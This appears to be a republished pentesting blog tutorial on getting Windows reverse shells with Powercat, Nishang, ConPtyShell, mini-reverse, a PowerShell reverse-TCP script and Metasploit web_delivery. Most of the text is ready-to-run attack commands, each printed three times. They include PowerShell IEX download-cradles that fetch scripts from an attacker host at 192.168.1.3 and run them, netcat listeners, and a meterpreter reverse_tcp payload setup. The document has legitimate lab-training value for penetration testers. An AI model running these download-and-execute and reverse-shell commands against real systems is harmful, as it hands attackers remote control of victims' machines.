---
-layout:post
-categories:
 -技术
---

# PowerShell for Pentester: Windows Reverse Shell

[<time class="entry-date published updated" datetime="2021-12-03T13:45:26+00:00">December 3, 2021</time>](https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/) by [Raj Chandel](https://www.hackingarticles.in/author/admin/)

Today, we’ll explore how to acquire a reverse shell using Powershell scripts on the Windows platform.

### Table of Content

* Powercat
* Invoke-PowerShellTcp (Nishang)
* ConPtyShell
* Mini-reverse
* PowerShell Reverse TCP
* Web_delivery (Metasploit)

### Requirements:

Kali Linux

Windows Machine

### Powercat 

Powercat is a basic network utility for performing low-privilege network communication operations. Powercat is a program that offers Netcat’s abilities to all current versions of Microsoft Windows. It tends to make use of native PowerShell version 2 components.

We need to go to the website listed below. Users may download the link because it is a Github website.

wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1

wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
</pre>

Let’s transfer this file using Python, we must start the Python server.

python -m SimpleHTTPServer 80

python -m SimpleHTTPServer 80

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
python -m SimpleHTTPServer 80
</pre>

![](https://blogger.googleusercontent.com/img/a/AVvXsEjHq78EVsSCI_qVLOzm2bj07tpSUqvSnK0_-o0FHEqfxlDjRW-oYqA1sOa7WdHmeQTA68DtSJ1PiEpl_wcutpfd6C_YYJFLTRif6QlQW68ls6pcCG72f4SdsNk6UwG_KtXAe24ivrM-L8r7Tobwbd8jBjH2jMY_-Ippeak6csFU5MLrQB1mrVvKkq8qQg=s16000)

Users must start a Netcat listener on port 4444 for obtaining a reverse connection by using the command

nc -vlp 4444.

nc -vlp 4444.

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
nc -vlp 4444.
</pre>

So now we need to boot up our Windows machine and run the PowerShell command inside the command prompt (CMD). Please note that the IP address should be your local IP address (Kali IP address).

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.3/powercat.ps1');powercat -c 192.168.1.3 -p 4444 -e cmd"

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.3/powercat.ps1');powercat -c 192.168.1.3 -p 4444 -e cmd"

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.3/powercat.ps1');powercat -c 192.168.1.3 -p 4444 -e cmd"
</pre>

![](https://blogger.googleusercontent.com/img/a/AVvXsEg4o7lllnEGOuEt7O5FhzmK_VZfHJs7RTTIEH180FFYuQBT3D0OpNuZmTHdAWGpl_kd_vM8I0ms-9jruHLREl4rM-Kw_Rp61MI-7aas0WdLg8MQB_yEwWW0GOf6JSCJ3VK4G-9J61v_WE537nRQEAr5_6p7JnVBwPKSBCHG31qHx1LJBFtJIxygLjvt8Q=s16000)

You will get the reverse shell in the Netcat listener once the command is executed, can use the command **whoami** to see whether we get the correct shell. This will tell you the user account type logged in.

![](https://blogger.googleusercontent.com/img/a/AVvXsEiaaxiSHW0OPUFyaLZv5Eq90cgEoa20nRD6nDS2Kj0XkMb60G-AZ4nw42aE8rUO3b9Kb-THFlmAxVj2M7OcFMlSpjP-bHKDQa1HQSO3anFStbArAiFosB0GPEqtu5i9wPoiqBXx0Qn6gZdz6caKiVRLHyM9SP7F6sWasFbrUjKCRphq6kZqroK5hYBSCQ=s16000)

### Invoke-PowerShellTcp (Nishang)

This PowerShell script can be used to Reverse or Bind Interactive PowerShell. To link up the script to a port, we need to use a Netcat listener.

This website, which is mentioned below, should be visited.

Since it is a Github website, you should indeed download the link.

wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
</pre>

Through wget, the script is downloaded, now we have to transfer this file through python sever.

python -m SimpleHTTPServer 80

python -m SimpleHTTPServer 80

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
python -m SimpleHTTPServer 80
</pre>

![](https://blogger.googleusercontent.com/img/a/AVvXsEhBZgjYSCdprBnFdXEjzipqgqfa8Zg2tgz-D8OKBrJYV0xYnSjjxHX9ghzmO5OKL9l42b8-2B-XurKIl4Q8VnKHqHayHeFX9EOR0znIVcuW5Fgx9o1xiXfpP8DXQSlA0Az3ANw1DgFkTYYdB4ZiWiwbjnjeVK1INBLeeh40_lq4xCNJRZh8ybdqTr8Urw=s16000)

To obtain a reverse connection, we should first launch a Netcat listener on port 4444.

nc -vlp 4444

nc -vlp 4444

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
nc -vlp 4444
</pre>

Users must run the following command into the command prompt of the Windows machine. It will assist in the execution of the PowerShell file.

Remember that the IP address should be your local IP address(Kali IP address).

powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.1.3/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.3 -Port 4444

powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.1.3/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.3 -Port 4444

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.1.3/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.3 -Port 4444
</pre>

![](https://blogger.googleusercontent.com/img/a/AVvXsEjR3n5lZnKlhx81RckPbfXkkOM_kbvXCedreJMtmQpFJBZ3oYCvjquqZ4_VrMmO5U9hRPOkgK3Tmdpt-hGHMDSmyXnBdiQT69ah77Y57suXe4KwVV96ywNpkVHhwKB6TiLw8J1FbSm6I5ZAfUbq_coUOEbTv7WvmlPr_-xM5vdUJw_h3cwlrlr-FGy5uA=s16000)

Once run the script, so we also get the reverse shell in the Netcat listener.

Use the command **“whoami”** maybe we just have the correct reverse shell. This will tell you the user account type logged in.

![](https://blogger.googleusercontent.com/img/a/AVvXsEjklDuniyGdAXmgahAXTUYtb10QRFPZztGv_Qmkva0w3KPdy3nMeI-wHDgx9Owik9lBG8_On1vcLXXyB22RvqkGS0aVnfHA9Xhan2TUpjY5VzC3Q3Hg1TpiFhH-hRMxs_TitQqjUdEVHKKkeSxKUu9d6xgczZZ9AO1UsJfiFTcguIGlRTVGAM5eHEbTbw=s16000)

### ConptyShell 

ConPtyShell is a Windows server Interactive Reverse Shell. ConPtyShell converts your bash shell into a remote PowerShell. **CreatePseudoConsole()** is a ConPtyShell function that was first used 

It creates a Pseudo Console and a shell to which the Pseudo Console is connected with input/output.

Users need to go to the website listed below.

As it is a Github website, you must download the link.

wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1

wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
</pre>

As we run the link, the script is downloaded, now we have to transfer this file through python sever.

python -m SimpleHTTPServer 80

python -m SimpleHTTPServer 80

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
python -m SimpleHTTPServer 80
</pre>

![](https://blogger.googleusercontent.com/img/a/AVvXsEjD075oOSj_hAoog_zhCL3b_GLm0WfJ1oWzR1Di81k8AajXCtlKU44J_3BXjJ-FXK_PsjCttjkfxPswW-Xmz-_obe8ThIg9IldNKm7E66w1lS8v6Z8RJVxytUKp-jnl6sw8RjUzku0P7UpC9MebyRA41I9Ev5JpXCzUByqBMa4wAp6S5da7PD7xt6cr2w=s16000)

Start a Netcat listener on port 4444 for obtaining a reverse connection.

stty raw -echo; (stty size; cat) | nc -lvnp 4444

stty raw -echo; (stty size; cat) | nc -lvnp 4444

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
stty raw -echo; (stty size; cat) | nc -lvnp 4444
</pre>

**![](https://blogger.googleusercontent.com/img/a/AVvXsEi1HO3kIIppYXy9ZbWN46RRPaDsVbxGkj3BTq1bv3jL3lXwZhi-n13L95MJ_rvdwfBaAPc9rTpmXrcMrYx8JKGBX-5j63bFHFWtVl9kSwvNb1e_mtjHRrSzuCf-OAGpXHteC8BhDnaQnzET_JQP6BP1blAfDxV_RJOqkCJWqLzXAIHjGJ5LWjREADe1xA=s16000)**

Users should enter the following command into the command prompt of the Windows machine. It will help in the execution of the ConPtyShell file.

Remember that the IP address should be your local IP address (Kali IP address).

powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.1.3/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell 192.168.1.3 4444

powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.1.3/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell 192.168.1.3 4444

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.1.3/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell 192.168.1.3 4444
</pre>

![](https://blogger.googleusercontent.com/img/a/AVvXsEjeK2s2JrgedoxFoZR9MPSZvUqIdohCg5CjIhASSsPluq4ZEz1r9Rn9sRyn4ItFON6HObBrMQ5R02rtQODJMgtM8y8DGehbvq8FurludqIKYffXY01yXaBE3q2LwP1nZc2huIU6EWCrHsWFQIiBFAocoF3mSw_ztDn46y2Rnhgmk7Qb9KLq6Bv6E1A1sA=s16000)

We can see that the pseudo function is created and we get a fully interactive shell once the command is used.

![](https://blogger.googleusercontent.com/img/a/AVvXsEh6UAPNanFeGZFnezOKcugh3A6EFd0k5tI4GzcPmWGFWJaYYv_qgFFpLpDuv_-NQSkNI28SD5Z9YDQyWGCIs8am-OPHYSiKlgp_uc-oRgxEWOs6wuIfJHiCDiizAF4A_rITckYBwI4gyVDQaZdpwMDR9ULjkzO1e8opnqFlVaukldOdlzzqp6JmQhSYHw=s16000)

### mini-reverse.ps1

Using the small mini-reverse script, we will obtain a reverse shell.

This website, which is listed below, must be visited, and because it is a Github website, we must download the link.

wget https://gist.githubusercontent.com/Serizao/6a63f35715a8219be6b97da3e51567e7/raw/f4283f758fb720c2fe263b8f7696b896c9984fcf/mini-reverse.ps1

wget https://gist.githubusercontent.com/Serizao/6a63f35715a8219be6b97da3e51567e7/raw/f4283f758fb720c2fe263b8f7696b896c9984fcf/mini-reverse.ps1

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
wget https://gist.githubusercontent.com/Serizao/6a63f35715a8219be6b97da3e51567e7/raw/f4283f758fb720c2fe263b8f7696b896c9984fcf/mini-reverse.ps1
</pre>

![](https://blogger.googleusercontent.com/img/a/AVvXsEj1wQymdCk9vyC-D3pyKsmOVpFJmdnGvxHNN3CSjKel7OaYlXFyWLAIfEwAb1MMGoJ468Kt3S3iZBtaPDXTjewWovhGzUplpzEIjxH9Plm0zGRSZaoBLnVuDa9tJg36KglVE4etExwKEQsyhoJ5Ck3qp12TkqACqMWaf-jfjhYQJhjGqyyQB6fcM6U05g=s16000)

****We must examine the code within the script and change the IP address provided there to our local IP address (Kali IP address).

Once you’ve finished making changes, save the file and start up the Python server.

python -m SimpleHTTPServer 80

python -m SimpleHTTPServer 80

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
python -m SimpleHTTPServer 80
</pre>

![](https://blogger.googleusercontent.com/img/a/AVvXsEj7UiNinc_SooGhGk9jaKL1ltTdkivTlifk249nTuMQXda6P1bbIZYWJq9Fjl-Ff95EEn5S4c-8dxmg7vNDYeV-CTAypwFk3Y3vgXEPHMwKebfsQwNd_N1SWAzMP03AXuk5OTF_r04Rw4ocZeX2i6XKuZUeD8KYM6g6mnDh4VKCAIH38KimAPjqVPLmXA=s16000)

To obtain a reverse connection, one must first launch a Netcat listener on port 4444.

nc -nvlp 4444

nc -nvlp 4444

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
nc -nvlp 4444
</pre>

Users must enter the following command into the command prompt of the Windows machine. It will ease the execution of the mini reverse file. Keep in mind that the IP address should be your local IP address (Kali IP address). The command will assist us in obtaining the reverse shell.

powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.3/mini-reverse.ps1')

powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.3/mini-reverse.ps1')

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.3/mini-reverse.ps1')
</pre>

![](https://blogger.googleusercontent.com/img/a/AVvXsEifBUFVSuAEeRS95MjyIVHxYKTmQw_ISnHOM4yMSTh0a50PJVo1ngnsaVa2J_IeYtELZCG3-Y16APDHfJETOJ6HM7L0un7U9yfI2ETD5_z_ZotLXlzFRen_CfDIOCn9sqrR7tDUikwzbUnkzgErTQj0sq5FtIY6dBoUnadwwUYpTl5LmAJ5PfqsoxY9Tg=s16000)

We get the reverse shell in the Netcat listener

![](https://blogger.googleusercontent.com/img/a/AVvXsEg2pKaaWYS1qdxd23z4u18ECTJEMfI_R3h4EGdppe-mFR_zU0npTbfC-5aJbtVYPDxK8aEIwj6vD3fVrfr5NJoYymy4lahkRnqhbH9PIbZj6j_fqRk-RiLugG9pYDbu0aYAyKFEriJUeGxbGwD_j4F30NaGI8LioQu9Whfr0t6F2GKIDGVZnHiuFiaEQA=s16000)

### PowerShell Reverse TCP   

Now just use PowerShell script to communicate with a remote host. Instead of process pipes, all shells in this environment use the Invoke-Expression command. The remote host has complete control over the client at all times.

We have to go to the website listed below. It is a Github website, you must download the link.

wget https://raw.githubusercontent.com/ivan-sincek/powershell-reverse-tcp/master/src/powershell_reverse_tcp.ps1

wget https://raw.githubusercontent.com/ivan-sincek/powershell-reverse-tcp/master/src/powershell_reverse_tcp.ps1

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
wget https://raw.githubusercontent.com/ivan-sincek/powershell-reverse-tcp/master/src/powershell_reverse_tcp.ps1
</pre>

![](https://blogger.googleusercontent.com/img/a/AVvXsEjC7IWCO7bLYty4L5vkj4d85H1QyX380A4WHbc6deoZL5E_nNedAHOULYBjwoyjORXk7qmC0K3oPzwdyRb07knSX75Wj4Xoq7tv_cxrpRv0iDTSt7RX29OlI01gg3mdceH6tBhLnE23k0_iQS-WQCGcO6jEM2T0HodePDft1_T8EDgMo_iv-2tjVcSfcg=s16000)

When the script has been downloaded, simply examine the code within it and replace the IP address given there with our local IP address (Kali IP address). Once the changes are done save the file and start the python server.

python -m SimpleHTTPServer 80

python -m SimpleHTTPServer 80

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
python -m SimpleHTTPServer 80
</pre>

![](https://blogger.googleusercontent.com/img/a/AVvXsEjmRHyoe_GLHGx4lKpDl4d3z5obilyzgJ5qmpV4Pidb8KcP04CxIER6TmzIg2mrJB8Dm2O9-HW61pw3A_JaETTojgvAxfgbEGK-HCfPmb8MFQ_5DGJfk4BY7qrV4IvnUklGhUOOX25p24T2Ag9RKrXYK_DKixAXhEmmgMBktsT_sdaGXGJlkHPlhMTyqg=s16000)

After that start the Netcat listener on port 9000 for obtaining a reverse connection.

nc -vlp 9000

nc -vlp 9000

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
nc -vlp 9000
</pre>

We must run the following command into the command prompt of the Windows machine. It will help us in running the reverse tcp.ps1 file. Remember that the IP address should be your local IP address (Kali IP address). The command will assist us in obtaining the reverse shell.

powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.3/powershell_reverse_tcp.ps1')

powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.3/powershell_reverse_tcp.ps1')

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.3/powershell_reverse_tcp.ps1')
</pre>

![](https://blogger.googleusercontent.com/img/a/AVvXsEh3Fs6481ueGXoDSCZctDvArdCX3x2AyTUv0vm9_gFzL4iL0Ek0rVeyaoz94d1PYjYG8UKRB8CLQNlvwGYyt9xbgtNwdectfquQQMqOv_t55yS3A9IG7R8a-TRfpS_vDuX1nhY5ICVcjqFs2tPvXkkNF-Bvm48oZBD86KEz1uvK941AcKtu0xmyWIou4Q=s16000)

As soon as the command is executed, we get the reverse shell.

![](https://blogger.googleusercontent.com/img/a/AVvXsEj87XLeoACl8qdOc3c8m50xYhbRYlxCpgu5NF3niWxgaPv0dJ7_7rAIyThW2c18t5bIAL5AXXvhaC2wWFoejcuZYb8flGMTOPOB_CbzgGWRMGJx7U-gZLM6slWetV_St7YjmqU_Aws_cICvH7tKhM_YiZVOBPp9rpUp6T7EmaaQQcoRGXvMqjeTumX2cA=s16000)

### Web_Delivery

This exploit makes use of the Metasploit Framework, and the operating systems targeted are Windows and Linux. This attack makes use of a payload.

**Payload:**

Payloads are malicious scripts that an attacker uses to interact with a target machine to achieve the attack. In Metasploit, the payload files are stored in modules.

**Executable Payload:**

Users should launch the Metasploit framework and search for **“web delivery**.” We will be given two payload options and must choose the one that contains a web delivery script.

make use of

exploit/multi/script/web delivery

exploit/multi/script/web delivery

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
exploit/multi/script/web delivery
</pre>

Start looking for targets using **“show targets**,” so we see nearly 5 targets that help generate code so that a backdoor is created. Then select the second target and use the command

 set target 2

 set target 2

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
 set target 2
</pre>

and use the commands below to set the payload and the lhost, lport, and then exploit it.

set payload python/meterpreter/reverse_tcp

set lhost 192.168.1.13

set lport 8888

exploit

set payload python/meterpreter/reverse_tcp
set lhost 192.168.1.13
set lport 8888
exploit

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
set payload python/meterpreter/reverse_tcp
set lhost 192.168.1.13
set lport 8888
exploit
</pre>

![](https://blogger.googleusercontent.com/img/a/AVvXsEjxo1A-TKUspTeV4qUNV__Ke9nBC6WwhSjYERf4HIO5-H7t7G5LvaB55j0R-vs1RAT3vcKfoGb9e1CENFi96LfdNWlAKAqE827jD9f84fGj3Ygr06LKOzym-Nailx2IPMKxz2DRwGASk9AwAhmuUzQYEVbGC_DVbSlqEKjAOTe2ZsBzHSR9QfmBaXDJkQ=s16000)

Code that we get after running the script, just copy the script and run it on our windows machine. Once the execution is done set the session to

sessions 1

sessions 1

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
sessions 1
</pre>

You will get a meterpreter shell and with ease get the info about that shell with the following command.

sysinfo

sysinfo

<pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic">
sysinfo
</pre>

**![](https://blogger.googleusercontent.com/img/a/AVvXsEhVktaOE1H-lsM1Zf1fViyemQl5tsZt_yuLXOs57zyqeEJ1bEfwvJ06YXU_W2l7DUd_oDIAbqPml3dG3oGBoVZKyssZD5DcrAe0yw2EEucAP5Ru-FBtJp2AEmhFmM_QhGCJ46OALBsercVekqgBKc2PhF6HXrw3sk7W_ciW0612FQewqTNl-Xe4iy3meQ=s16000)**
